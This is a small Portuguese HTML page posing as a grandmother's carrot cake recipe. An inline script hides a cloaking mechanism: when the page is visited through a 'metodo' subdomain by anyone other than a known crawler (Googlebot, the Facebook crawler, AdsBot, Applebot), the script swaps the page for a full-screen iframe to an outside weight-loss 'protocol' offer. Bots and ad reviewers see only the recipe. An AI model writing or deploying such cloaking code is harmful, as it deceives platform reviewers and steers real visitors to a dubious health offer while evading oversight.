<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <title>Delícias da Vovó</title>
    <style>
        /* Força o corpo da página a ocupar 100% sem sobrar espaço */
        html, body { 
            margin: 0 !important; 
            padding: 0 !important; 
            height: 100% !important; 
            width: 100% !important; 
            overflow: hidden !important;
            -webkit-overflow-scrolling: touch;
        }
        /* Estilo do Iframe para ocupar a tela inteira como um aplicativo */
        #oferta-iframe { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none; 
            margin: 0; 
            padding: 0;
            z-index: 999999;
        }
        .safe-content { padding: 20px; font-family: sans-serif; }
    </style>
</head>
<body>

<script>
    const currentHost = window.location.hostname;
    const isBot = /bot|googlebot|facebookexternalhit|adsbot-google|applebot/i.test(navigator.userAgent);

    // Se entrar pelo subdomínio e não for robô, injeta o Iframe reforçado
    if (currentHost.includes('metodo') && !isBot) {
        document.body.innerHTML = '<iframe id="oferta-iframe" src="https://protocoloemagrecimentodivino.lovable.app/" allow="fullscreen"></iframe>';
    }
</script>

<div class="safe-content">
    <h1>O Melhor Bolo de Cenoura Perfeito</h1>
    <p>Esta é a receita tradicional da família...</p>
    <ul>
        <li>3 cenouras</li>
        <li>3 ovos</li>
    </ul>
</div>

</body>
</html>
